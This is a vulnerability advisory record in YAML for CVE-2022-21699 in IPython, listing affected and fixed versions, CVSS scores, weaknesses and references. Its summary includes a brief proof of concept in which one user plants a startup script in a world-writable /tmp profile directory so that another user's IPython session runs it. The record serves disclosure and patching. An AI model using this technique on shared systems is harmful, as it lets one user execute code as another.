advisory_id: pypi/ipython/CVE-2022-21699
datasource_id: gitlab_importer_v2/pypi/ipython/CVE-2022-21699
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/ipython/CVE-2022-21699.yml
aliases:
  - CVE-2022-21699
  - GHSA-pq7m-3gw7-gq5x
summary: |
  Execution with Unnecessary Privileges in ipython
  Weâ€™d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.

  Proof of concept

  User1:
  ```
  mkdir -m 777 /tmp/profile_default
  mkdir -m 777 /tmp/profile_default/startup
  echo 'print("stealing your private secrets")' > /tmp/profile_default/startup/foo.py
  ```

  User2:
  ```
  cd /tmp
  ipython
  ```



  User2 will see:
  ```
  Python 3.9.7 (default, Oct 25 2021, 01:04:21)
  Type 'copyright', 'credits' or 'license' for more information
  IPython 7.29.0 -- An enhanced Interactive Python. Type '?' for help.
  stealing your private secrets
  ```
impacted_packages:
  - purl: pkg:pypi/ipython
    affected_versions: vers:pypi/<5.11|>=6.0.0|<7.16.3|>=7.17.0|<7.31.1|>=8.0.0|<8.0.1
    fixed_versions: vers:pypi/5.11|7.16.3|7.31.1|8.0.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv2
    scoring_elements: AV:L/AC:L/Au:N/C:P/I:P/A:P
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/ipython/CVE-2022-21699.yml
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/pypi/ipython/CVE-2022-21699.yml
weaknesses:
  - CWE-279
  - CWE-250
  - CWE-269
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/ipython/ipython
    reference_type:
    reference_id:
  - url: https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668
    reference_type:
    reference_id:
  - url: https://github.com/ipython/ipython/commit/5fa1e409d2dc126c456510c16ece18e08b524e5b
    reference_type:
    reference_id:
  - url: https://github.com/ipython/ipython/commit/67ca2b3aa9039438e6f80e3fccca556f26100b4d
    reference_type:
    reference_id:
  - url: https://github.com/ipython/ipython/commit/a06ca837273271b4acb82c29be97c0b6d12a30ea
    reference_type:
    reference_id:
  - url: https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x
    reference_type:
    reference_id:
  - url: https://github.com/pypa/advisory-database/tree/main/vulns/ipython/PYSEC-2022-12.yaml
    reference_type:
    reference_id:
  - url: https://ipython.readthedocs.io/en/stable/whatsnew/version8.html#ipython-8-0-1-cve-2022-21699
    reference_type:
    reference_id:
  - url: https://lists.debian.org/debian-lts-announce/2022/01/msg00021.html
    reference_type:
    reference_id:
  - url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CRQRTWHYXMLDJ572VGVUZMUPEOTPM3KB
    reference_type:
    reference_id:
  - url: https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/DZ7LVZBB4D7KVSFNEQUBEHFO3JW6D2ZK
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-21699
    reference_type:
    reference_id: CVE-2022-21699
  - url: https://github.com/advisories/GHSA-pq7m-3gw7-gq5x
    reference_type:
    reference_id: GHSA-pq7m-3gw7-gq5x
